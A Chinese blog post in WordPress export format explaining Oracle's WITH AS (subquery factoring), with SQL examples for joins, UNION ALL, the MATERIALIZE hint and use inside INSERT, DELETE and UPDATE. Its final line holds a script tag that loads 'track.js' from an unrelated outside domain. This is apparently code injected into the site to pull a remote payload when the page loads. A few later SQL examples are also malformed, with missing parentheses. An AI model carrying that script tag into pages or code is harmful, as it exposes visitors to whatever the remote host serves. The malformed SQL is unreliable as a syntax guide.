---
id: 21
title: 'with as 在oracle中的运用'
date: '2019-11-14T15:56:30+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=21'
permalink: /index.php/2019/11/14/with-as-%e5%9c%a8oracle%e4%b8%ad%e7%9a%84%e8%bf%90%e7%94%a8/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Oracle
---

语法：

<div class="cnblogs_code">```
with tempName as (select ....)
select ...
```

</div>\--针对一个别名  
with tmp as (select \* from tb\_name)

\--针对多个别名  
with  
tmp as (select \* from tb\_name),  
tmp2 as (select \* from tb\_name2),  
tmp3 as (select \* from tb\_name3),  
…

\--相当于建了个e临时表  
with e as (select \* from scott.emp e where e.empno=7499)  
select \* from e;

\--相当于建了e、d临时表  
with  
e as (select \* from scott.emp),  
d as (select \* from scott.dept)  
select \* from e, d where e.deptno = d.deptno;

with as 相当于虚拟视图。

with as短语，也叫做子查询部分(subquery factoring)，可以让你做很多事情，定义一个sql片断，该sql片断会被整个sql语句所用到。

有的时候，是为了让sql语句的可读性更高些，也有可能是在union all的不同部分，作为提供数据的部分。

特别对于union all比较有用。

因为union all的每个部分可能相同，但是如果每个部分都去执行一遍的话，则成本太高，所以可以使用with as短语，则只要执行一遍即可。

如果with as短语所定义的表名被调用两次以上，则优化器会自动将with as短语所获取的数据放入一个temp表里，如果只是被调用一次，则不会。

而提示materialize则是强制将with as短语里的数据放入一个全局临时表里。

很多查询通过这种方法都可以提高速度。

with  
sql1 as (select to\_char(a) s\_name from test\_tempa),  
sql2 as (select to\_char(b) s\_name from test\_tempb where not exists (select s\_name from sql1 where rownum=1))  
select \* from sql1  
union all  
select \* from sql2  
union all  
select 'no records' from dual  
where not exists (select s\_name from sql1 where rownum=1)  
and not exists (select s\_name from sql2 where rownum=1);

由于with as是内存中的table所以还是比较快的。如果数据比较大的时候建议不要用with as这样的话变得很慢。

<div>WITH AS 与增删改查结合用法</div><div>注意：1.with必须紧跟引用的select语句</div><div>2.with创建的临时表必须被引用，否则报错</div><div></div><div>select 与 with as 连用</div><div>with tmp as （select * from 表名） select * from tmp</div><div>insert into 与with as 连用</div><div>insert into 表名（字段名） with tmp as （select * from 表） select * from tmp</div><div>delete 与with as 连用</div><div>delete from 表名 where exists （with tmp as select * from 表 select * from tmp）</div><div>update 与 with as 连用</div><div>update 表名 a set a.字段= （with tmp as select * from 表 select 字段 from tmp where tmp.字段 = a.字段）</div><div></div> <script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>